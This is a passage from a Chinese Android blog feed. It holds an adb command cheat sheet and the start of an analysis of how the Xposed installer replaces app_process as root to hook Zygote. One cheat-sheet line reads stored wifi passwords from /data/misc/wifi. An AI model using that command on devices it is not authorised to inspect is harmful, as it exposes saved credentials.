<li><p>查看Service列表<br><code>adb shell service list</code><br><code>adb shell dumpsys activity services</code></p>
</li>
</ul>
<ul>
<li><p>检查Service是否存在<br><code>adb shell service check phone</code></p>
</li>
<li><p>获取机器MAC地址：<br><code>adb shell  cat /sys/class/net/wlan0/address</code></p>
</li>
<li><p>获取CPU序列号：<br><code>adb shell cat /proc/cpuinfo</code></p>
</li>
<li><p>安装APK：<br><code>adb install &lt;apkfile&gt; //比如：adb install baidu.apk</code></p>
</li>
<li><p>保留数据和缓存文件，重新安装apk：<br><code>adb install -r &lt;apkfile&gt; //比如：adb install -r baidu.apk</code></p>
</li>
<li><p>安装apk到sd卡：<br><code>adb install -s &lt;apkfile&gt; // 比如：adb install -s baidu.apk</code></p>
</li>
<li><p>卸载APK：<br><code>adb uninstall &lt;package&gt; //比如：adb uninstall com.baidu.search</code></p>
</li>
<li><p>卸载app但保留数据和缓存文件：<br><code>adb uninstall -k &lt;package&gt; //比如：adb uninstall -k com.baidu.search</code></p>
</li>
<li><p>启动应用：<br><code>adb shell am start -n &lt;package_name&gt;/.&lt;activity_class_name&gt;</code></p>
</li>
<li><p>查看数据库：<br><code>adb shell content query --uri  content://settings/secure</code></p>
</li>
<li><p>查看设备cpu和内存占用情况：<br><code>adb shell top</code></p>
</li>
<li><p>查看占用内存前6的app：<br><code>adb shell top -m 6</code></p>
</li>
<li><p>刷新一次内存信息，然后返回：<br><code>adb shell top -n 1</code></p>
</li>
<li><p>查询各进程内存使用情况：<br><code>adb shell procrank</code></p>
</li>
<li><p>启动应用程序:<br><code>adb shell am</code></p>
</li>
<li><p>杀死一个进程：<br><code>adb shell kill [pid]</code></p>
</li>
<li><p>查看进程列表：<br><code>adb shell ps</code></p>
</li>
<li><p>查看Android系统的属性<br><code>adb shell prop</code></p>
</li>
<li><p>查看指定进程状态：<br><code>adb shell ps -x [PID]</code></p>
</li>
<li><p>查看后台services信息：<br><code>adb shell service list</code></p>
</li>
<li><p>adb 查看最上层成activity名字：</p>
<blockquote>
<p>linux:<br><code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows:<br><code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
</blockquote>
</li>
<li><p>查看当前内存占用：<br><code>adb shell cat /proc/meminfo</code></p>
</li>
<li><p>查看IO内存分区：<br><code>adb shell cat /proc/iomem</code></p>
</li>
<li><p>将system分区重新挂载为可读写分区：<br><code>adb remount</code></p>
</li>
<li><p>从本地复制文件到设备：<br><code>adb push &lt;local&gt; &lt;remote&gt;</code></p>
</li>
<li><p>从设备复制文件到本地：<br><code>adb pull &lt;remote&gt; &lt;local&gt;</code></p>
</li>
<li><p>列出目录下的文件和文件夹，等同于dos中的dir命令：<br><code>adb shell ls</code></p>
</li>
<li><p>进入文件夹，等同于dos中的cd 命令：<br><code>adb shell cd &lt;folder&gt;</code></p>
</li>
<li><p>重命名文件：<br><code>adb shell rename path/oldfilename path/newfilename</code> </p>
</li>
<li><p>删除system/avi.apk：<br><code>adb shell rm /system/avi.apk</code></p>
</li>
<li><p>删除文件夹及其下面所有文件：<br><code>adb shell rm -r &lt;folder&gt;</code> </p>
</li>
<li><p>移动文件：<br><code>adb shell mv path/file newpath/file</code></p>
</li>
<li><p>设置文件权限：<br><code>adb shell chmod 777 /system/fonts/DroidSansFallback.ttf</code></p>
</li>
<li><p>新建文件夹：<br><code>adb shell mkdir path/foldelname</code></p>
</li>
<li><p>查看文件内容：<br><code>adb shell cat &lt;file&gt;</code> </p>
</li>
<li><p>查看wifi密码：<br><code>adb shell cat /data/misc/wifi/*.conf</code> </p>
</li>
<li><p>清除log缓存：<br><code>adb logcat -c</code></p>
</li>
<li><p>查看bug报告：<br><code>adb bugreport</code></p>
</li>
<li><p>获取设备名称：<br><code>adb shell cat /system/build.prop</code></p>
</li>
<li><p>查看ADB帮助：<br><code>adb help</code></p>
</li>
<li><p>跑monkey：<br><code>adb shell monkey -v -p your.package.name 500</code></p>
</li>
<li><p>dump堆栈：<br><code>debuggerd -b &lt;pid&gt;</code></p>
</li>
<li><p>备份与恢复:</p>
<blockquote>
<p>备份：<br><code>adb backup -f c:\allowBackup.ab -noapk com.ijinshan.browser_fast</code><br>恢复：<br><code>adb restore &quot;c:\allowBackup.ab&quot;</code></p>
</blockquote>
</li>
<li><p>拷贝文件(这些命令都是在adb下用，而不是在shell中用):</p>
<blockquote>
<p>push从电脑端向手机复制文件:<br><code>adb push d:/adb/test.txt /data/data/download/</code><br>pull从手机端向本地复制文件:<br><code>adb pull /data/data/download/ d:/adb/</code></p>
</blockquote>
</li>
<li><p>查看应用程序内存使用情况:<br><code>adb shell dumpsys meminfo &lt;package_name&gt;</code></p>
<blockquote>
<p>其中，package_name 也可以换成程序的pid,<br>pid可以通过 <code>adb shell top | grep app_name</code> 来查找.<br>内存使用情况参考<code>http://blog.csdn.net/bigconvience/article/details/35553983</code></p>
</blockquote>
</li>
<li><p>查看进程占用cpu的情况:<br><code>adb shell top -n 1 -d 0.5 | grep proc_ id</code></p>
</li>
<li><p>procrank查看内存占用：<br><code>adb shell procrank</code></p>
<blockquote>
<p>VSS - Virtual Set Size 虚拟耗用内存（包含共享库占用的内存）<br>RSS - Resident Set Size 实际使用物理内存（包含共享库占用的内存）<br>PSS - Proportional Set Size 实际使用的物理内存（比例分配共享库占用的内存）<br>USS - Unique Set Size 进程独自占用的物理内存（不包含共享库占用的内存）</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>快速查看apk内androidmanifest文件内容:<br><code>aapt dump xmltree xxxx.apk AndroidManifest.xml</code></p>
</li>
<li><p>列出一些系统信息和所有应用的信息:<br><code>adb shell dumpsys packages &gt; d:\\packages.txt</code></p>
</li>
<li><p>列出一些指定应用的信息:<br><code>adb shell dumpsys package com.ijinshan.duba &gt; d:\\duba.txt</code></p>
</li>
<li><p>查看当前谁持有WAKE_LOCK锁对象：<br><code>adb shell dumpsys power</code></p>
</li>
<li><p>查看电池用量详情：<br><code>adb shell dumpsys batteryinfo</code></p>
</li>
<li><p>搜索文件：<br><code>busybox find -name *xxx*</code></p>
</li>
<li><p>电池日志：<br><code>adb shell dumpsys batterystats &gt; x:\batterystats.txt</code><br><code>bugreport日志：adb bugreport &gt; x:\bugreport.txt</code></p>
</li>
<li><p>电池日志图形界面查看<br><code>https://github.com/cacker/battery-historian</code></p>
</li>
<li><p>查看应用uid<br><code>cat /proc/&lt;pid&gt;/status</code><br><code>cat /data/system/packages.list | grep xxx</code></p>
</li>
<li><p>cpu频率<br>查看：<br><code>cat [%cpuFreqPath%]/cpuinfo_cur_freq (当前cpu频率)</code><br>修改：<br><code>echo xxx &gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</code></p>
<blockquote>
<p>cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_cur_freq   (当前cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq  (最大cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq  (最小cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/related_cpus  (cpu数量标号,从0开始,如果是双核,结果为0,1)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies  (cpu所有可用频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors  (cpu所有可用调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor (当前使用哪种调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_transition_latency (变频延迟)</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>某个应用内存消耗信息<br><code>adb shell dumpsys meminfo sina.mobile.tianqitong &gt; d:\\meminfo.txt</code></p>
</li>
<li><p>zygote的堆栈dump</p>
<blockquote>
<p>adb shell // 进入shell<br>chmod 777 /data/anr // /data/anr设置可读写权限<br>rm -r traces.txt // 删除原始traces<br>adb shell ps //查看进程pid<br>kill -3 <pid> //<br>adb pull /data/anr/traces.txt d:/trace.txt<br><strong>trace中查看cpu调度的基本信息</strong></pid></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">"Thread-196" prio=5 tid=27 SUSPENDED</span><br><span class="line">| sysTid=2271 nice=0 sched=0/0 cgrp=apps/bg_non_interactive handle=1543812984</span><br><span class="line">| state=S schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</span><br><span class="line">#00  pc 000217a8  /system/lib/libc.so (__futex_syscall3+8)</span><br><span class="line">#01  pc 0000e09c  /system/lib/libc.so (__pthread_cond_timedwait_relative+48)</span><br><span class="line">#02  pc 0000e0f8  /system/lib/libc.so (__pthread_cond_timedwait+60)</span><br><span class="line">#03  pc 0005419d  /system/lib/libdvm.so (dvmChangeStatus(Thread*, ThreadStatus)+72)</span><br><span class="line">#04  pc 00049995  /system/lib/libdvm.so</span><br><span class="line">#05  pc 0004b9c1  /system/lib/libdvm.so</span><br><span class="line">#06  pc 0006e721  /system/lib/libandroid_runtime.so</span><br><span class="line">#07  pc 0001e610  /system/lib/libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">#08  pc 0004df29  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+500)</span><br><span class="line">#09  pc 00027a24  /system/lib/libdvm.so</span><br><span class="line">#10  pc 000fedc8  [stack:2271]</span><br><span class="line">at android.util.Log.println_native(Native Method)</span><br><span class="line">at android.util.Log.println(Log.java:332)</span><br><span class="line">at com.android.internal.os.AndroidPrintStream.log(AndroidPrintStream.java:47)</span><br><span class="line">at com.android.internal.os.LoggingPrintStream.println(LoggingPrintStream.java:311)</span><br><span class="line">at java.net.PlainSocketImpl.read(PlainSocketImpl.java:487)</span><br><span class="line">at java.net.PlainSocketImpl.access$000(PlainSocketImpl.java:46)</span><br><span class="line">at java.net.PlainSocketImpl$PlainSocketInputStream.read(PlainSocketImpl.java:240)</span><br><span class="line">at java.io.InputStream.read(InputStream.java:163)</span><br><span class="line">at java.io.BufferedInputStream.fillbuf(BufferedInputStream.java:142)</span><br><span class="line">at java.io.BufferedInputStream.read(BufferedInputStream.java:309)</span><br><span class="line">at com.sina.push.i.c.c(SourceFile:241)</span><br><span class="line">at com.sina.push.i.c.b(SourceFile:133)</span><br><span class="line">at com.sina.push.i.c.d(SourceFile:270)</span><br><span class="line">at com.sina.push.i.c.e(SourceFile:496)</span><br><span class="line">at com.sina.push.i.c.&lt;init&gt;(SourceFile:97)</span><br><span class="line">at com.sina.push.b.a.b.a(SourceFile:56)</span><br><span class="line">at com.sina.push.b.e.a(SourceFile:166)</span><br><span class="line">at com.sina.push.b.e$b$a.run(SourceFile:487)</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>其中<code>schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</code><br>从左到右六个数字分别是:<br>1- 当前线程在cpu上消耗的时间<br>2- 当前任务在CPU任务轮询中的等待时间<br>3- 当前线程在这个cpu上运行的次数<br>4- 当前线程的用户态执行时间<br>5- 当前线程的内核态执行时间<br>6- 当前线程在哪里个核心上执行<br>实际上描述了调度的基本信息</p>
<ul>
<li>SYSTEM LOG<br><code>logcat -b system -v time -d *:v | grep sina.mobile</code><blockquote>
<p>-b <buffer> // 加载一个可使用的日志缓冲区供查看，比如event和radio,默认值是main.<br>system // system log<br>-v // 输出字段 time 显示时间<br>-d // 缓冲区日志打印并退出<br>*:v // 日志级别高到低 E W I D V<br>grep sina.mobile // 过滤包含sina.mobile的信息</buffer></p>
</blockquote>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<ul>
<li><p>获取编译时间<br><code>cat /proc/version</code></p>
</li>
<li><p>内核崩溃<br><code>cat /proc/last_kmsg</code></p>
</li>
<li><p>获取硬件信息<br><c]]>
    </summary>
    
      <category term="adb" scheme="http://blog.idhyt.com/tags/adb/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓注入框架Xposed分析与简单应用]]></title>
    <link href="http://blog.idhyt.com/2015/09/25/android-injection-xposed/"/>
    <id>http://blog.idhyt.com/2015/09/25/android-injection-xposed/</id>
    <published>2015-09-24T18:29:11.000Z</published>
    <updated>2015-12-28T02:20:50.000Z</updated>
    <content type="html"><![CDATA[<h3 id="概述">概述</h3><p>Xposed是针对Android平台的动态劫持项目，源码<a href="https://github.com/rovo89" target="_blank" rel="external">github</a></p>
<h4 id="主要模块说明如下：">主要模块说明如下：</h4><p><strong>Xposed</strong>：Xposed的C++部分，主要是用来替换/system/bin/app_process，并为XposedBridge提供JNI方法。</p>
<p><strong>XposedInstaller</strong>：Xposed的安装包，负责配置Xposed工作的环境并且提供对基于Xposed框架的Modules的管理。在安装XposedInstaller之后，app_process与XposedBridge.jar放置在了/data/data/de.robv.android.xposed.installer。</p>
<p><strong>XposedBridge.jar</strong>：XposedBridge.jar是Xposed提供的jar文件，负责在Native层与FrameWork层进行交互。/system/bin/app_process进程启动过程中会加载该jar包，其它的Modules的开发与运行都是基于该jar包的。注意：XposedBridge.jar文件本质上是由XposedBridge生成的APK文件更名而来，查看该工程目录下的install.bat</p>
<pre><code><span class="label">cd</span> /d %~dp0
<span class="label">dir</span> <span class="keyword">bin\XposedBridge.apk
</span><span class="label">adb</span> <span class="keyword">push </span><span class="keyword">bin\XposedBridge.apk </span>/<span class="preprocessor">data</span>/<span class="preprocessor">data</span>/de.robv.<span class="keyword">android.xposed.installer/bin/XposedBridge.jar.newversion
</span><span class="label">pause</span>
</code></pre><p><strong>XposedMods</strong>：使用Xposed开发的一些Modules，其中AppSettings是一个可以进行权限动态管理的应用</p>
<h4 id="Xposed框架的基本运行环境如下：">Xposed框架的基本运行环境如下：</h4><table>
<thead>
<tr>
<th>Configuration</th>
<th>RequireMent</th>
</tr>
</thead>
<tbody>
<tr>
<td>Root Access</td>
<td>因为Xposed工作原理是在/system/bin目录下替换文件，在install的时候需要root权限，但是运行时不需要root权限</td>
</tr>
<tr>
<td>版本要求</td>
<td>需要在Android 4.0以上版本的机器中</td>
</tr>
</tbody>
</table>
<h3 id="源码分析">源码分析</h3><h4 id="XposedInstaller">XposedInstaller</h4><p>通过<code>/XposedInstaller/AndroidManifest.xml</code>看出主activity为WelcomeActivity，<br>主要实现了界面加载，添加功能图标和描述信息Item，如Install, Modules, Download等。<br>选择Framework后进入界面<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-1.jpg" alt="android-xposed-1"></p>
<p>我们直接找到install代码，install代码定位的简单方法：<br>先点击install进入安装界面，然后在输入adb命令查看当前最顶层activity，就可以定位到代码。</p>
<p>adb 查看最上层成activity名字<br>linux: <code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows: <code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
<p>最后定位到install代码位于InstallerFragment中，代码及注释如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该代码的功能就是替换了app_process文件</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">install</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取安装的方式，直接写入 or 使用 recovery进行安装</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> installMode = getInstallMode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查获取Root权限</span></span><br><span class="line">    <span class="keyword">if</span> (!startShell())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; messages = <span class="keyword">new</span> LinkedList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">boolean</span> showAlert = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        messages.add(getString(R.string.sdcard_location, XposedApp.getInstance().getExternalFilesDir(<span class="keyword">null</span>)));</span><br><span class="line">        messages.add(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">"Xposed-Disabler-Recovery.zip"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把Xposed-Disabler-Recovery.zip文件 从asset copy到sdcard中</span></span><br><span class="line">        <span class="keyword">if</span> (AssetUtil.writeAssetToSdcardFile(<span class="string">"Xposed-Disabler-Recovery.zip"</span>, <span class="number">00644</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">""</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">"Xposed-Disabler-Recovery.zip"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将编译后的app_process二进制文件，从asset文件夹中，copy到/data/data/de.robv.android.xposed.installer/bin/app_process</span></span><br><span class="line">        File appProcessFile = AssetUtil.writeAssetToFile(APP_PROCESS_NAME, <span class="keyword">new</span> File(XposedApp.BASE_DIR + <span class="string">"bin/app_process"</span>), <span class="number">00700</span>);</span><br><span class="line">        <span class="keyword">if</span> (appProcessFile == <span class="keyword">null</span>) &#123;</span><br><span class="line">            showAlert(getString(R.string.file_extract_failed, <span class="string">"app_process"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL) &#123;</span><br><span class="line">            <span class="comment">// 普通安装模式</span></span><br><span class="line">            <span class="comment">// 重新挂载/system为rw模式</span></span><br><span class="line">            <span class="comment">// Normal installation</span></span><br><span class="line">            messages.add(getString(R.string.file_mounting_writable, <span class="string">"/system"</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"mount -o remount,rw /system"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_mount_writable_failed, <span class="string">"/system"</span>));</span><br><span class="line">                messages.add(getString(R.string.file_trying_to_continue));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查看原有的app_process文件是否已经备份，如果没有备份，现将原有的app_process文件备份一下</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> File(<span class="string">"/system/bin/app_process.orig"</span>).exists()) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_backup_already_exists, <span class="string">"/system/bin/app_process.orig"</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"cp -a /system/bin/app_process /system/bin/app_process.orig"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                    messages.add(<span class="string">""</span>);</span><br><span class="line">                    messages.add(getString(R.string.file_backup_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    messages.add(getString(R.string.file_backup_successful, <span class="string">"/system/bin/app_process.orig"</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                mRootUtil.executeWithBusybox(<span class="string">"sync"</span>, messages);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将项目中的自定义app_process文件copy覆盖系统的app_process,修改权限</span></span><br><span class="line">            messages.add(getString(R.string.file_copying, <span class="string">"app_process"</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"cp -a "</span> + appProcessFile.getAbsolutePath() + <span class="string">" /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_copy_failed, <span class="string">"app_process"</span>, <span class="string">"/system/bin"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"chmod 755 /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_perms_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"chown root:shell /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_owner_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_AUTO) &#123;</span><br><span class="line">            <span class="comment">// 自动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareAutoFlash(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_MANUAL) &#123;</span><br><span class="line">            <span class="comment">// 手动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareManualFlash(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        File blocker = <span class="keyword">new</span> File(XposedApp.BASE_DIR + <span class="string">"conf/disabled"</span>);</span><br><span class="line">        <span class="keyword">if</span> (blocker.exists()) &#123;</span><br><span class="line">            messages.add(getString(R.string.file_removing, blocker.getAbsolutePath()));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"rm "</span> + blocker.getAbsolutePath(), messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_remove_failed, blocker.getAbsolutePath()));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy XposedBridge.jar 到私有目录，XposedBridge.jar是Xposed提供的jar文件，负责在Native层与FrameWork层进行交互</span></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">"XposedBridge.jar"</span>));</span><br><span class="line">        File jarFile = AssetUtil.writeAssetToFile(<span class="string">"XposedBridge.jar"</span>, <span class="keyword">new</span> File(JAR_PATH_NEWVERSION), <span class="number">00644</span>);</span><br><span class="line">        <span class="keyword">if</span> (jarFile == <span class="keyword">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">""</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">"XposedBridge.jar"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// 将有关文件系统的存储器常驻信息送入物理介质内，在暂停系统之前,比如要重新启动机器,一定要去执行sync命令</span></span><br><span class="line">        mRootUtil.executeWithBusybox(<span class="string">"sync"</span>, messages);</span><br><span class="line"></span><br><span class="line">        showAlert = <span class="keyword">false</span>;</span><br><span class="line">        messages.add(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL)</span><br><span class="line">            offerReboot(messages);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            offerRebootToRecovery(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>, installMode);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 删除busybox 工具库</span></span><br><span class="line">        AssetUtil.removeBusybox();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (showAlert)</span><br><span class="line">            showAlert(TextUtils.join(<span class="string">"\n"</span>, messages).trim());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="为什么要替换app_process">为什么要替换app_process</h4><p>在android的源码中的init.rc文件可以看到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">service zygote /system/bin/app_process -Xzygote /system/bin –zygote –start-system-server</span><br><span class="line">socket zygote stream <span class="number">666</span> </span><br><span class="line">onrestart write /sys/android_power/request_state wake</span><br><span class="line">onrestart write /sys/power/state on</span><br><span class="line">onrestart restart media</span><br><span class="line">onrestart restart netd</span><br></pre></td></tr></table></figure>
<p>app_process是andriod app的启动程序，该注入框架通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。与采取传统的Inhook方式<a href="http://www.mulliner.org/android/feed/mulliner_dbi_hitb_kul2013.pdf" target="_blank" rel="external">Dynamic Dalvik Instrumentation</a>相比，Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。</p>
